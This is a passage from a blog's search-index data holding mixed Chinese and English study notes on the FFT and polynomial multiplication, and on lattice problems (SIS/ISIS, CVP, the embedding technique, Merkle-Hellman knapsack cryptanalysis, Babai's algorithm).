\\frac{(\\omega^{-j})^i\\omega^{-j}}{n\\omega^{-j}}=\\frac{\\omega^{-ij}}n \\end{aligned} $$ 展开写作 $$ \\begin{gathered}\\mathcal{F}^{-1}=\\frac1n\\begin{bmatrix}(\\omega^{-0})^0\u0026(\\omega^{-0})^1\u0026\\cdots\u0026(\\omega^{-0})^{n-1} \\\\ (\\omega^{-1})^0\u0026(\\omega^{-1})^1\u0026\\cdots\u0026(\\omega^{-1})^{n-1} \\\\ \\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\ (\\omega^{-(n-1)})^0\u0026(\\omega^{-(n-1)})^1\u0026\\cdots\u0026(\\omega^{-(n-1)})^{n-1}\\end{bmatrix}\\end{gathered} $$ 这就完成了对比分析过程。 上述多少有些 Abuse of notation ，应稍作总结。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:4:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Summary 1. Definition Fourier Transform Matrix $\\mathcal{F}$: $$ \\mathcal{F}_{N} = \\begin{bmatrix} \\omega_N^{0 \\cdot 0} \u0026 \\omega_N^{0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{0 \\cdot (N-1)} \\\\ \\omega_N^{1 \\cdot 0} \u0026 \\omega_N^{1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{1 \\cdot (N-1)} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ \\omega_N^{(N-1) \\cdot 0} \u0026 \\omega_N^{(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{(N-1) \\cdot (N-1)} \\end{bmatrix} $$ where $\\omega_N = e^{-\\frac{2\\pi i}{N}}$ is the $N$-th root of unity. Inverse Fourier Transform Matrix (\\mathcal{F}^{-1}): $$ \\mathcal{F}^{-1}_{N} = \\frac{1}{N} \\begin{bmatrix} \\omega_N^{0 \\cdot 0} \u0026 \\omega_N^{0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{0 \\cdot (N-1)} \\\\ \\omega_N^{1 \\cdot 0} \u0026 \\omega_N^{1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{1 \\cdot (N-1)} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ \\omega_N^{(N-1) \\cdot 0} \u0026 \\omega_N^{(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{(N-1) \\cdot (N-1)} \\end{bmatrix} $$ 一类利用单位根，来做到优化时间复杂度。 2. FFT and IFFT FFT: For a sequence $X_k$, the FFT is defined as: $$ \\text{FFT}(x) = X_k = \\sum_{n=0}^{N-1} x_n \\omega _N^{-kn} $$ or using matrix notation: $$ X = \\mathcal{F}_{N} x $$ where $\\mathcal{F}_{N}$ is the Fourier transform matrix. IFFT: For the sequence $X_k$, the IFFT is given by: $$ x_n = \\frac{1}{N} \\sum_{k=0}^{N-1} X_k \\omega_N^{kn} $$ or using matrix notation: $$ x = \\mathcal{F}^{-1}_{N} X $$ where $\\mathcal{F}^{-1}_{N}$ is the inverse Fourier transform matrix. 3. Compact Formula for FFT Using the uniform symbols and subscripts, the FFT formula is: $$ X_k = \\sum_{n=0}^{N-1} x_n \\omega _N^{-kn} $$ In matrix form: $$ X = \\mathcal{F}_{N} x $$ where $\\mathcal{F}_{N}$ is: $$ \\mathcal{F}_{N} = \\begin{bmatrix} \\omega_N^{0 \\cdot 0} \u0026 \\omega_N^{0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{0 \\cdot (N-1)} \\\\ \\omega_N^{1 \\cdot 0} \u0026 \\omega_N^{1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{1 \\cdot (N-1)} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ \\omega_N^{(N-1) \\cdot 0} \u0026 \\omega_N^{(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{(N-1) \\cdot (N-1)} \\end{bmatrix} $$ 4. Compact Formula for IFFT The IFFT formula is: $$ x_n = \\frac{1}{N} \\sum_{k=0}^{N-1} X_k \\omega_N^{kn} $$ In matrix form: $$ x = \\mathcal{F}^{-1}_{N} X $$ where $\\mathcal{F}^{-1}_{N}$ is: $$ \\mathcal{F}^{-1}_{N} = \\frac{1}{N} \\begin{bmatrix} \\omega_N^{0 \\cdot 0} \u0026 \\omega_N^{0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{0 \\cdot (N-1)} \\\\ \\omega_N^{1 \\cdot 0} \u0026 \\omega_N^{1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{1 \\cdot (N-1)} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ \\omega_N^{(N-1) \\cdot 0} \u0026 \\omega_N^{(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{(N-1) \\cdot (N-1)} \\end{bmatrix} $$ Conclusion FFT: $X = \\mathcal{F}_{N} x$ IFFT: $x = \\mathcal{F_{N}}^{-1} X = \\frac{1}{N} \\mathcal{F_{N}}^{\\dagger} X$ Where $\\mathcal{F_{N}^{\\dagger}}$ denotes the conjugate transpose of $\\mathcal{F_{N}}$. Note that where: $X = [X_0,X_1,…,X_{N-1}]^T$ is the frequency domain representation. $x = [x_0,x_1,…,x_{N-1}]^T$ is the time domain sequence. $\\omega_N = e^{- \\frac{2\\pi i}{N}}$ is the $N$-th root of unity. $\\mathcal{F}_N$ is the $N\\times N$ Fourier transform matrix, whose conjugate transpose used for IFFT. ","date":"2024-07-01","objectID":"/waytofft-part-1/:4:1","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Fast polynomial multiplication Fast polynomial multiplication of two polynomials. For two polynomials: $$ \\begin{align}p(x)\u0026= a_0+a_1x+\\cdots+a_{n-1}x^{n-1},\\\\ q(x)\u0026= b_0+b_1x+\\cdots+b_{n-1}x^{n-1} \\end{align} $$ Their product $$ (p\\cdot q)(x)=p(x)\\cdot q(x)=c_0+c_1x+\\cdots c_{2n-2}x^{2n-2} $$ where $$ c_i = \\sum_{\\max \\set{0,i-(n-1)}\\le k \\le \\min \\set {i,n-1}} a_k b_{i-k} $$ ","date":"2024-07-01","objectID":"/waytofft-part-1/:5:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Algorithm Evaluate $p(x)$ and $q(x)$ at $2n$ points $\\omega_{2n}^0,…,\\omega_{2n}^{2n-1}$ using DFT. Obtain the values of $p(x)q(x)$ at these $2n$ points through pointwise multiplication $$ \\begin{aligned} (p\\cdot q)(\\omega_{2n}^{0})\u0026 =\\quad p(\\omega_{2n}^0)\\cdot q(\\omega_{2n}^0), \\\\ (p\\cdot q)(\\omega_{2n}^1)\u0026 =\\quad p(\\omega_{2n}^1)\\cdot q(\\omega_{2n}^1), \\\\ \u0026… \\\\ (p\\cdot q)(\\omega_{2n}^{2n-1})\u0026 =\\quad p(\\omega_{2n}^{2n-1})\\cdot q(\\omega_{2n}^{2n-1}). \\end{aligned} $$ Interpolate the polynomial $p \\cdot q$ at the product values using IDFT to obtain $c_0,..,c_{2n-2}$. 步骤1, 2, 3 对应时间复杂度为 $\\Theta(n\\log n),\\Theta(n\\log n).\\Theta(n).$ 代数角度来看，是利用单位根元素构成的特殊代数结构及其性质完成的策略。 不难联想到，利用 FFT 也可以计算 两向量卷积。 卷积（Convolution）: $$ a = (a_0,…,a_{n-1}) \\quad and\\quad b = (b_0,…,b_{n-1}) $$ 定义卷积所得向量 $c$ $$ c_j = \\sum_{k=0}^j a_k b_{j-k}, j = 0,…,n-1 $$ 时间复杂度也为 $\\Theta(n\\log n)$. Reference Fast polynomial multiplication Polynomial: From FT to NTT Polynomial Multiplication and Fast Fourier Transform (Com S 477/577 Notes) Yan-Bin Jia. Sep 20, 2022 Number Theoretic Transform - CCRMA, Stanford A Complete Beginner Guide to the Number Theoretic Transform (NTT) ","date":"2024-07-01","objectID":"/waytofft-part-1/:5:1","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Begin with Knapsack. Note from CS355 \u0026 Regev. ","date":"2024-06-18","objectID":"/lattice-part-3/:0:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Short Integer Solution (SIS) problem ","date":"2024-06-18","objectID":"/lattice-part-3/:1:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Definition The SIS problem is parameterized by the matrix dimensions $n,m \\in \\mathbb{N}$, modulus $q$, and a norm bound $B$ on the solution. One should think of $n$ as the parameter $\\lambda$ that defines the hardness of the problem. The bigger $n$ is, the harder the problem becomes. The parameter $m$ is set depending on the specific applications, but generally $m \\gg n$. The modulus $q$ can be set to be any $q = \\operatorname{poly}(n)$, but concretely, just think of $q = O(n^2)$. The norm bound $B \\ll q$ should also be set depending on the specific applications. Notice that a solution $z$ for $A$ can be converted to a solution for the extension $[A|A^{\\prime}]$ by appending $0$s to $z$: big $m\\Rightarrow$ easy (the more vectors we are given, the easier the problem becomes) big $n\\Rightarrow$ hard (the more dimension we work in the harder the problem becomes) It is conjectured that for any sufficiently large $n \\in \\mathbb{N}$ (this is the security parameter), for any $m,q,B \\in \\mathbb{N}$, satisfying $q \\gt B\\cdot\\operatorname{poly}(n)$ (for any polynomial poly) , the $\\text{SIS}(n,m,q,B)$ is hard. But we cannot say that Short Integer Solution (SIS𝑆𝐼𝑆) problem is NP-Complete. Application: CRHF, SLHL etc. SIS 问题可以最终规约到格中的 SIVP 问题上，进而在选定参数的情况下，在部分情况下是可以求解的。一般的，Inhomogeneous SIS （非齐次情况）在 CTF 中遇到的更多. ","date":"2024-06-18","objectID":"/lattice-part-3/:1:1","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Without Modulus Modification Let $n$ be an integer and $\\alpha=\\alpha(n),\\beta=\\beta(n),m=m(n)\u003e\\Omega(n\\log\\alpha)$ be functions of $n$.Sample a uniform $A\\leftarrow[-\\alpha,\\alpha]^{n\\times m}$.The task is to compute “short” vector $e\\in\\mathbb{Z}^m$ in the kernel of $A$. That is: $$ \\begin{cases} \\Vert e \\Vert \u0026\\lt \\beta \\\\ A \\cdot e \u0026= 0^n \\end{cases} $$ Here, equality holds over the integers. Trivial attack: There is an trivial algorithm in the case where $\\beta$ is huge. You can compute a kernel vector over the integers by taking minors of the matrix $A$.These minors, and hence the kernel vector, can be easily upper bounded by $(\\alpha n)^{O(n)}$. So in the regime $\\beta=(\\alpha n)^{O(n)}$, there is a trivial attack. It’s intersting to care about the distribution on matrix $A$. However it is still no doubt that if limiation of norm is set, then the problem is set to be hard. ","date":"2024-06-18","objectID":"/lattice-part-3/:1:2","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Inhomogeneous Short Integer Solution (ISIS) problem Inhomogeneous SIS is applied for OWF (one way function) and then Digital Signatures. We shall mentioned it in subsequent notes. ","date":"2024-06-18","objectID":"/lattice-part-3/:2:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Inhomogeneous linear equations 即对于这样的线性方程，可以考虑它的解空间，对于这样的解空间可以找到他的一组正交基，由于我们工作在整数上，即纯量域为 $\\mathbb{Z}$ ，所以所得基向量，可张成 Lattice . 自然地，考虑非齐次线性方程 $$ \\langle a,z\\rangle\\equiv c\\mathrm{~mod~}q\\tag{5.2} $$ 首先，注意到 $\\vec{0}$ 不是 Eq. 5.2 的一个解，那么 Eq. 5.2 的解便无法构成一个格空间。 特别的，$\\mathcal{x} \\in \\mathbb{Z}^{n}$ 是 Eq. 5.2 一个解，当且仅当 $\\mathcal{x} - \\mathcal{z}$ 是方程的一个解。那么代数上来看 Eq. 5.2 的所有解可以表示为齐次方程的解空间的一个陪集： $$ \\mathcal{L}+z $$ 这里，我们需要将找到 Eq. 5.2 一个 $l_2$ 范数意义上较短的解，同 CVP 联系起来。如过只是找到一组解，而没有任何范数意义上的限定，这样的求解是十分trivial的。 ","date":"2024-06-18","objectID":"/lattice-part-3/:3:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Solving linear equations for short integer solution. 当我们在用格规约一组方程所在线性空间的基向量时，我们在做什么？ ","date":"2024-06-18","objectID":"/lattice-part-3/:4:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Gaussian expected shortest length Definition. Let $\\mathcal{L}$ be a lattice of dimension $n$. The $\\textit{Gaussian expected shortest length}$ is $$ \\sigma (L)=\\sqrt{\\frac{n}{2\\pi e}}(\\det L)^{1/n} $$ The Gaussian heuristic says that a shortest nonzero vector in a“ randomly chosen lattice\" will satisfy $$ \\Vert v_\\text{shortest}\\Vert \\approx\\sigma(\\mathcal{L}) $$ More precisely, if $\\epsilon\\gt 0$ is fixed, then for all sufficiently large $n$, a randomly chosen lattice of dimension $n$ will satisfy $$ (1-\\epsilon)\\sigma(\\mathcal{L})\\leq\\Vert v_{\\mathrm{shortest}}\\Vert \\leq(1+\\epsilon)\\sigma(\\mathcal{L}) $$ 注意到，$\\Vert v_{\\mathrm{shortest}} \\Vert = \\lambda_1(\\mathcal{L})$ 容易联想到，此前 Minkowski’s Second Theorem 给出的行列式为单的上界 $$ \\left(\\prod_{i=1}^n\\lambda_i\\right)^{1/n}\\leq\\sqrt{n}(\\det\\Lambda)^{1/n} $$ 然而这仅仅给出 $\\lambda_i$ 的增长速度是受到行列式限制的，或者说，$\\lambda_i$ 的排布相对紧 (tight). 但这里 Gaussian 从概率的角度给出了 $\\lambda_i$ 的期望值，并引入 $\\epsilon$ 给出了一个关于 $\\lambda_i$ 的一个更紧的界。 ","date":"2024-06-18","objectID":"/lattice-part-3/:4:1","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Recall LLL property LINK Let $B = \\set{b_1,…,b_n}$ be a $\\delta$-$LLL$-reduced basis. Then $$ \\Vert b_1 \\Vert \\le \\left(\\frac{2}{\\sqrt{4\\delta-1}}\\right)^{n-1}\\lambda_{1} \\le\\left(\\frac{2}{\\sqrt{4\\delta-1}}\\right)^{n-1}\\sqrt{n}\\cdot\\Vert\\det(\\mathcal{L})\\Vert^{1/n} $$ 利用这一中间界： ","date":"2024-06-18","objectID":"/lattice-part-3/:4:2","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Conclusion $$ \\begin{cases} \\Vert B\\Vert \\le \\sigma(\\mathcal{L}),\\mathcal{L}\\text{~is~}\\mathcal{L}(B) \\\\ v\\mathcal{L} = w\\end{cases} $$ 即我们令 $\\Vert B\\Vert = \\det \\mathcal{L} \\le \\sigma(\\mathcal{L})$, 此时只需判定这个不等式是否成立来判定 LLL 的解的情况。 至此我们只需要把目标问题化归到 $\\gamma$-SVP 即可。 那么一般思路就是，构造合适的 lattice , 将我们的目标短向量嵌入其中，调整行列式大小 (re-scale the lattice) 来进行规约以求解。这里有时用到了 Embedding Technique . ","date":"2024-06-18","objectID":"/lattice-part-3/:4:3","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Embedding Technique 前文有提到，非齐次状态下的小范数求解，可证明为 CVP 问题，也可化归到工作在陪集 $\\mathcal{L} - t$ 上的 SVP 问题，现介绍一种手法来近似求解这一问题。 令基向量矩阵为$B$，给定目标向量 $t = c$，那么一般的构造如下矩阵： $$ B^{\\prime} = \\begin{bmatrix} c \u0026 B \\\\ 1 \u0026 0 \\end{bmatrix} $$ 注意到 $$ \\det B^{\\prime} = \\det B $$ 那么 $$ \\operatorname{vol}B^{\\prime} = \\operatorname{vol} B $$ 令目标向量 所得 CVP 的解为 $x = \\sum \\lambda_i b_i$ . 那么此时在 $B^{\\prime}$ 中存在短向量 $(c-x,1)$ (Embedding) . 此时完成了一个近似CVP的解。 那么一定条件下，只需将待求非齐次方程 $ u = \\sum a_i x_i$转化为 目标向量 求解即可。值得注意的是，有时需要先调整行列式大小，再规约，然后再做相反的调整。 更详细的证明，会在接下来的Knapsack 中给出解释。 ","date":"2024-06-18","objectID":"/lattice-part-3/:4:4","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Knapsack Cryptography 相比于RSA的模幂运算，背包密码的运行速度要快的多。 在非齐次情况下求解小范数根，了解 Knapsack Cryptography 及其 attack 是十分有帮助的。 ","date":"2024-06-18","objectID":"/lattice-part-3/:5:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"The Subset-Sum Problem We begin by recalling the definition of the subset-sum problem, also called the “knapsack” problem, in its search form. ","date":"2024-06-18","objectID":"/lattice-part-3/:5:1","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Superincreasing sequence ","date":"2024-06-18","objectID":"/lattice-part-3/:5:2","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Merkle Hellman Start with some superincreasing sequence $\\boldsymbol{b} = (b_1,\\dots,b_n)$ Choose some modulus $m\u003e\\sum_{i=1}^n b_i$, uniformly random $w \\leftarrow\\mathbb{Z_m}^{*}$ and uniformly random permutation $\\pi$ on $\\set{1,\\dots,n}$ Let $a_i=w\\cdot b_{\\pi(i)}\\mod m$. The public key is $a = ( a_1, \\ldots , a_n)$, and the trapdoor is $(m,w,\\pi).$ The encryption of a message $\\mathbf{x}\\in{0,1}^n$ is then $$ s=\\mathsf{Enc_\\mathbf{a}}(\\mathbf{x})=\\langle \\vec a,\\mathbf{x}\\rangle=w \\cdot \\sum_{i=1}^{n} b_{\\pi(i)} x_{i}. $$ Given the trapdoor $(m,w,\\pi)$, we can decrypt $s$ as follows: Simply compute $$ s^{'}=w^{-1}s=\\sum_{i=1}^{n} b_{\\pi(i)}x_i\\mod m $$ then solve the subset-sum problem for the permuted superincreasing $b$ and $s^{\\prime}$. 上述描述的原始 Knapsack 过程直接规约在 CVP 即可求解。在实际过程中不必考虑置换过程，直接考虑原始置换后的向量为目标向量即可。 ","date":"2024-06-18","objectID":"/lattice-part-3/:5:3","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Density The density of a subset-sum problem instance is $$ n/\\max_i \\log a_i $$ ","date":"2024-06-18","objectID":"/lattice-part-3/:5:4","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Lagarias-Odlyzko, Frieze 同样的利用上面给出的思路证明这个引理，但需要加入一些概率视角。 证明的核心思路为Embedding Technique. PROOF 在构造完 $\\bold{B}$ 后，$(x,0)^T \\in B$. 最后一行系数 $B$ 用于放缩. 值得关心的是这个算法取得目标向量的概率。 $$ \\bold{Bz}= (x,0)^T \\in \\mathcal{L},\\Vert \\bold{Bz}\\Vert \\le \\sqrt{n} $$ 对于这个格空间内的任一向量，最后一项为 $B$ 的倍数时（不含0），那么 $$ B \\gt 2^{n/2}\\cdot \\Vert x \\Vert \\ge 2^{n/2}\\cdot \\lambda_1(\\mathcal{L}) $$ 故而 $\\bold{B}$ 的 LLL 规约结果一定会有末项为 $0$ 的向量, 且范数最大为$2^{n/2}\\sqrt n$。( LLL property ) 故而在密度（density）不合适的时候，这里可能会解出 $k(x,0)$. 在处理格的概率分析时，只需要严格抓住格的均匀分布特征即可。不难有如下描述 引入参数 $\\epsilon$ 来刻画 $O(1)$ ","date":"2024-06-18","objectID":"/lattice-part-3/:5:5","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Summary Knapsack 这里重新给出一个简单版本的表述： 私钥为一个超递增序列 $\\set{a_n}$ , 满足 $a_i\\gt \\sum_{k=1}^{i-1}a_k$ , 模数$m$ ,满足$m\u003e\\sum_{i=1}^na_i$ ,乘数$w$ ,满足 $\\gcd ( w, m) = 1$ . 公钥为$\\boldsymbol{b} = (b_1,\\dots,b_n)$ ,满足 $b_i\\equiv wa_i\\pmod m$ 加密：设明文为 ${v_i},v_i\\in{0,1}$ ,则密文 $c$ 可表示为： $$ c \\equiv \\sum_{i=1}^{n} b_i v_i \\equiv \\sum_{i=1}^{n} wa_i v_i \\pmod m $$ 明文$v$: $$ v = w^{-1}c \\equiv \\sum_{i=1}^{n} v_i a_i \\pmod m $$ 构造矩阵 $$ \\mathcal{L} = \\begin{bmatrix} I \u0026 \\boldsymbol{b}^T \\\\ 0 \u0026 -c \\end{bmatrix} $$ $v = (v_1, \\dots, v_n, 0) \\in \\mathcal{L}$. 利用高斯启发式，可以证明我们能够规约出$v$. $$ \\sigma(\\mathcal{L}) = \\sqrt{\\frac{n}{2\\pi e}}\\Vert det\\mathcal{L} \\Vert^{1/(n+1)} = \\sqrt{\\frac{n}{2\\pi e}} c^{1/(n+1)} $$ 而 $$ \\Vert v \\Vert \\approx \\sqrt{n/2} \\le \\sigma(\\mathcal{L}) $$ 即 $$ \\frac{1}{\\pi e} c^{2/(n+1)} \\le 1 $$ 有$1-2^{-n^2(\\varepsilon-o(1))}$有解。 ","date":"2024-06-18","objectID":"/lattice-part-3/:5:6","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"References Babai’s Algorithm Knapsack Shortest Lattice Vectors in the Presence of Gaps Tover’s Blog ISIS problem discussion in LINK1,LINK2 SIS problem discussion in LINK1 A decade of lattice cryptography Cryptohack gitbook ISIS-small-q-code ISIS-small-q-paper Embedding attack ","date":"2024-06-18","objectID":"/lattice-part-3/:6:0","tags":[],"title":"Lattice Part 3","uri":"/lattice-part-3/"},{"categories":[],"content":"Describe an approximation algorithm to the Closest Vector Prolem. While LLL for SVP. ","date":"2024-06-14","objectID":"/lattice-part-2/:0:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"The Closest Vector Problem Definition : Given a target vector $\\boldsymbol{t}\\in\\mathbb{R}^n$ and a lattice $\\mathcal{L}\\subset\\mathbb{R}^n$, we define $$\\operatorname{dist}(\\mathcal{L},\\boldsymbol{t}):=\\min_{\\boldsymbol{x}\\in\\mathcal{L}}\\Vert\\boldsymbol{x}-\\boldsymbol{t}\\Vert:.$$ ","date":"2024-06-14","objectID":"/lattice-part-2/:1:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Hardness of CVP and relationship with SVP 将 CVP 规约到 SVP 上来。 及时二者均已证明为 NP 问题，但是二者的困难程度却是迥异的。$\\gamma$-SVP 要简单的多，CVP 也可视作 SVP 的非齐次形式。 一般的 SVP 工作在线性空间 $\\mathcal{L}$ 上，而相对的 CVP 工作在 $\\mathcal{L}$ 的一个陪集 $\\mathcal{L}- t$ 上。但由于所定义短向量不包含零向量，故不可直接更换工作所在群，直接规约 CVP 到 SVP. 那么如何绕过零向量构成的难题呢？构造陪集。 ","date":"2024-06-14","objectID":"/lattice-part-2/:2:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"What we do in SVP 实际上这是一个存在性证明，我们回顾在处理 SVP 问题中的处理: Blichfeld 为了证明这一引理 我们介绍 Fundamental Parallelepiped $\\mathcal{P}(B)$ Given the lattice basis vectors ${b_1,b_2,\\ldots,b_n}$, the fundamental parallelepiped $\\mathsf{P}(B)$ is the set of all linear combinations of these basis vectors with coefficients in the interval $[0,1)$. Mathematically, it is defined as: $$ \\mathcal{P}(B)= \\set{ \\sum_{i=1}^n \\lambda_{i} b_{i} \\mid {0} \\le \\lambda_{i} \\lt {1} } $$ 利用这里的基本域，接着可以对整个格空间大小，以行列式为单位进行划分: 不难发现 $$ \\sum_{x\\in\\Lambda}\\operatorname{vol}(\\widehat{S_x})=\\sum_{x\\in\\Lambda}\\operatorname{vol}(S_x)=\\operatorname{vol}(S)\u003e\\operatorname{vol}(\\mathcal{P}(B))=\\det \\Lambda. $$ 接下来便是优雅的鸽巢定理： 即 Since the combined volume of all $\\widehat{S_x}$ is greater than the volume of $\\mathcal{P}(B)$, there must be overlap among these translated regions. Therefore, there exist some $x,y \\in \\Lambda$ with $x \\ne y$ such that $\\widehat{S_x}$ and $\\widehat{S_y}$ intersect: $$ \\widehat{S_x} \\cup \\widehat{S_y} \\ne \\emptyset $$ Let $z$ be a point in this intersection. Then $z+x$ is in $S_x\\subseteq S$ and $z+y$ is in $S_y\\subseteq S$. The difference $(z+x)-(z+y)=x-y$ is in $\\Lambda$, proving that $S$ contains at least two points whose difference is a lattice vector. Q.E.D Minkowski’s Convex Body Theorem 这可以视作 Blichfeld 的推论，以为只需要注意调整系数的技巧和凸集的性质，便可证明: 不难发现这里的系数是以集合定义来调整响应系数。利用中心对称，构造一个向量。 综合上述思考过程，我们在坐标原点构造中心对称凸集、根据广义体积大小确定格点存在性，那么一个平凡的想法是对原有线性空间做一个划分，那么在每个划分中，可以做这样的分析来证明存在性，以此来构建近似求解 CVP 的可行性，那么在抽象代数中，对一个良好的代数结构进行划分的做法，一般的，构造陪集。 ","date":"2024-06-14","objectID":"/lattice-part-2/:2:1","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Reduce CVP to SVP 构造陪集的难点在于如何避开零向量的干扰。 即如何刻画一个划分，让我们的目标短向量落入其中，而零向量不在此列。技巧源于观察。观察短向量的坐标特征: 各个坐标项的至少有一个坐标为奇数（利用反证法容易证明）。具有这样特征结构的陪集，十分良好的规避了零向量的干扰。 PROOF: 其后的处理类同 SVP 的处理。 ","date":"2024-06-14","objectID":"/lattice-part-2/:2:2","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Babai’s Algorithm 欣喜地，我们在存在性的基础上，深入学习一个近似算法。 ","date":"2024-06-14","objectID":"/lattice-part-2/:3:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Pause GS in geometric 让我们留下一个基向量及其系数，来作为可以唯一确定超平面的参数 我们处理GS过程时，处理到 $b_n$ 时，便会留下一个子空间，由 $b_n$ 的线性组合决定。 The $n$ th Gram-Schmidt vector, $\\widetilde{\\boldsymbol{b_n}}$ , has a very nice geometric interpretation. In particular, consider the hyperplane (i.e. affine subspace) defined by all vectors $\\boldsymbol x \\in\\mathbb{R}^n$ (not necessarily lattice vectors) whose last coordinate is $c$ for some fixed $c$： $$ H_{c} := \\Set{ \\sum_{i=1}^{n-1} a_{i} \\boldsymbol{b_i} + c \\boldsymbol{b_n}} $$ Notice in particular that $H_{c} = H_{0}+c\\boldsymbol{b_n}$ . But, since $\\boldsymbol{b_n}$ is typically not orthogonal to $H_{0}$, the distance between $H_{0}$ and $H_{c}$ to the origin will typically not be $c \\Vert \\boldsymbol{b_n}\\Vert$ Instead, the distance will be the length of the component of $c \\boldsymbol{b_n}$ that is orthogonal to $H_{0}$ . I.e., it will be $c \\Vert \\widetilde{\\boldsymbol{b_n}}\\Vert$. 基于不同的系数 $c$ 原有格空间可以做这样的划分（以二维为例）： 接下来用一种递归的思路，同样的可以对剩下的每个 $n-1$ 维，做同样的处理。 ","date":"2024-06-14","objectID":"/lattice-part-2/:3:1","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Babai’s nearest hyperplane algorithm 基于上述的理解模型，可以把向量 $t$ 放置于各个超平面之间： With this picture in mind, the idea behind Babai’s algorithm is quite simple. Given a target vector $\\boldsymbol{t}\\in\\mathbb{R}^n$ and a lattice $\\mathcal{L}\\subset\\mathbb{R}^n$ with some basis $(\\boldsymbol{b_1},\\ldots,\\boldsymbol{b_n})$, it seems reasonable to look for a lattice vector that is close to $\\boldsymbol{t}$ inside the closest lattice hyperplane to $\\boldsymbol{t}$. So, Babai’s $\\textit{ nearest hyperplane algorithm }$ [Bab86] works by first identifying the nearest lattice hyperplane $H_c$ to $\\boldsymbol{t}$. For example, Babai’s algorithm would choose the hyperplane $H_{-1}$ in this example (though the closest vector to $\\boldsymbol{t}$ happens to lie in $H_0$ ): $H_c$ 包含了由 $n-1$ 个基向量张成的子格 $\\mathcal{L}^{'}$ 的一个陪集 $\\mathcal{L}^{'}+cb_{n}$ . 而 $\\mathcal{L}^{'}+cb_{n}$ 又可继续做陪集的划分。 对 $n - i + 1$ 维 不断进行处理，则可以最终停留在一个向量上，在此前的陪集划分后，选择子空间只需不断保证欧几里得距离的最优，便可得到近似求解 CVP 问题的一个解。 ","date":"2024-06-14","objectID":"/lattice-part-2/:3:2","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Huck Bennett suggestion Easier to understand. In coset $\\mathcal{L} - t$ , first we rotate space so that the basis $(b_1,\\dots,b_n)$ is upper triangular and looks like : Rewrite the vector $t$ in this rotated space. $$ \\boldsymbol{t}=\\begin{pmatrix}t_{1} \\\\ t_{2} \\\\ \\vdots \\\\ t_{n} \\end{pmatrix} $$ 那么此前描述的陪集划分与选择的过程实际上可以重新表述为： 在给定陪集中这个寻找第 $n$ 个坐标为最小的的向量。由于每次仅处理一个基向量，故前后处理互不影响。 对于参数 $c$ 的选择依旧按照向量投影的原则，定义四舍五入的运算。那么算法最终结束时，输出 $s$ 即可。 ","date":"2024-06-14","objectID":"/lattice-part-2/:3:3","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Analysis ","date":"2024-06-14","objectID":"/lattice-part-2/:4:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Property 1 Babai Nearest Algorithm 工作在 LLL 约简基当中，故而这一性质十分显然。 GS 中可以把一个向量在基变换后重新写为： $$ 